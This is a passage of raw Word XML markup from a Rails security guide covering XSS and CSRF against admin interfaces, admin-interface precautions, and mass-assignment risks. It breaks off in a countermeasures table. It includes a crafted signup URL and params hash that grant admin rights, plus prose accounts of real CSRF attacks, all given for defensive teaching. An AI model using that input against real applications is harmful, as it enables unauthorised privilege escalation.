    <w:p w14:paraId="18D99F21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBA811D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 Intranet and Admin Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F8245A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A97836A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the “Monster for employers” web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11993082" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> If your application re-displays malicious user input from the extranet, the application will be vulnerable to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE6AB24" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator’s cookie, injecting an iframe to steal the administrator’s password or installing malicious software through browser security holes to take over the administrator’s computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78405B97" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Refer to the Injection section for countermeasures against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. It is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>recommended to use the SafeErb plugin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> also in an Intranet or administration interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5806B60D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Cross-Site Reference Forgery (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works, here are a few examples of what attackers can do in the Intranet or admin interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1482F6DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A real-world example is a </w:t>
      </w:r>
      <w:hyperlink r:id="rId705" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">router reconfiguration by </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="caps"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>CSRF</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. The attackers sent a malicious e-mail, with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> request to reconfigure the user’s router (which is a popular model in Mexico). The request changed the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DNS</w:t>
      </w:r>
      <w:r>
        <w:t>-settings so that requests to a Mexico-based banking site would be mapped to the attacker’s site. Everyone who accessed the banking site through that router saw the attacker’s fake web site and had his credentials stolen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F44D2C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Another example changed Google Adsense’s e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E56DE02" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Another popular attack is to spam your web application, your blog or forum to propagate malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Of course, the attacker has to know the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application’s admin interface. The attacker may even do 1,000 lucky guesses by just including malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>IMG</w:t>
      </w:r>
      <w:r>
        <w:t>-tags which try every possible combination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358FB1BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">countermeasures against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> in administration interfaces and Intranet applications, refer to the countermeasures in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> section</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A296A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Additional Precautions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7A22DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The common admin interface works like this: it’s located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049859D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="337"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is very important to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>think about the worst case</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: What if someone really got hold of my cookie or user credentials. You could </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>introduce roles</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the admin interface to limit the possibilities of the attacker. Or how about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>special login credentials</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for the admin interface, other than the ones used for the public part of the application. Or a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>special password for very serious actions</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BB79F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="338"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Does the admin really have to access the interface from everywhere in the world? Think about </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>limiting the login to a bunch of source IP addresses_. Examine request.remote</w:t>
      </w:r>
      <w:r>
        <w:t>ip to find out about the user’s IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4342BD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="339"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Put the admin interface to a special sub-domain</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:t>) script on www.application.com may not read the cookie for admin.application.com and vice-versa.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71641B1B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>6 Mass Assignment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2870E1D5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Without any precautions Model.new(params[:model]) allows attackers to set any database column’s value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D946825" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The mass-assignment feature may become a problem, as it allows an attacker to set any model’s attributes by manipulating the hash passed to a model’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new()</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4E86AF68" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="116C1D06" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>signup</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BA230E3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  params[:user] # =&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="183A8022" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.new(params[:user])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17526202" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="200409F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Mass-assignment saves you much work, because you don’t have to set each value individually. Simply pass a hash to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method, or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assign_attributes=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a hash value, to set the model’s attributes to the values in the hash. The problem is that it is often used in conjunction with the parameters (params) hash available in the controller, which may be manipulated by an attacker. He may do so by changing the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FF12C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="HTML1"/>
      </w:pPr>
      <w:r>
        <w:t>http://www.example.com/user/signup?user[name]=ow3ned&amp;user[admin]=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357F8800" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This will set the following parameters in the controller:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6720"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="759ADDAA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78913493" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2103600173"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>params[:user] # =&gt; {:name =&gt; “ow3ned”, :admin =&gt; true}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5136C31C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>So if you create a new user using mass-assignment, it may be too easy to become an administrator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE7E8DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that this vulnerability is not restricted to database columns. Any setter method, unless explicitly protected, is accessible via the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attributes=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method. In fact, this vulnerability is extended even further with the introduction of nested mass assignment (and nested object forms) in Rails 2.3+. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>accepts_nested_attributes_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration provides us the ability to extend mass assignment to model associations (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t>). For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1D0EA174" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="27DCF1AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Person &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="623044B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    has_many :children</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70C87279" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54DC77EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    accepts_nested_attributes_for :children</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28F1B590" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BCF0F75" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3190D38C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Child &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C1065BF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    belongs_to :person</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C1C1998" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5554B2AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>As a result, the vulnerability is extended beyond simply exposing column assignment, allowing attackers the ability to create entirely new records in referenced tables (children in this case).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D57D1B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Countermeasures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D155A23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To avoid this, Rails provides two class methods in your Active Record class to control access to your attributes. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method takes a list of attributes that will not be accessible for mass-assignment. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5905A59E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
